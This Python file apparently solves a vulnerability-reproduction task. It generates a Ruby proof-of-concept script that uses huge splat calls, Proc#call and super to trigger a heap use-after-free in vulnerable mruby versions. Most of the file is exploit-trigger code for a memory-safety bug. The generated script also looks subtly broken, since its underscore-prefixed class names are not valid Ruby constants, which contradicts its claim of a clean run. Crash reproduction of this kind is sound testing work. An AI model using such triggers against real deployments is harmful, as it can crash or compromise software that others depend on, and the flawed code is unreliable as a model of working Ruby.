import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # PoC Ruby script designed to trigger a heap use-after-free in vulnerable mruby
        # by forcing mrb_stack_extend in several VM operations without raising exceptions
        # in the fixed version.
        N = 20000  # large enough to force stack grow without exceeding typical MRB_STACK_MAX

        parts = []

        # 1) Simple var-args method call with large splat to trigger OP_SEND path
        parts.append("""
def __poc_noop__(*args)
end

__poc_args__ = Array.new(%d, 1)
__poc_noop__(*__poc_args__)
""" % N)

        # 2) Proc#call with large splat (different code path, still OP_SEND internally)
        parts.append("""
__poc_proc__ = Proc.new {|*a|}
__poc_proc__.call(*__poc_args__)
""")

        # 3) super with large splat to trigger OP_SUPER path
        parts.append("""
class __POC_A__
  def foo(*a); end
end
class __POC_B__ < __POC_A__
  def foo(*a)
    __poc_args2__ = Array.new(%d, 2)
    super(*__poc_args2__)
  end
end
__POC_B__.new.foo(0)
""" % N)

        # 4) Another large var-args call to increase chance of hitting the buggy path again
        parts.append("""
def __poc_noop2__(*a); end
__poc_noop2__(*Array.new(%d, 3))
""" % N)

        # Ensure clean exit on fixed versions
        parts.append("""
# If we reached here without exceptions, print nothing and exit cleanly.
""")

        script = "\n".join(parts)
        return script.encode("utf-8")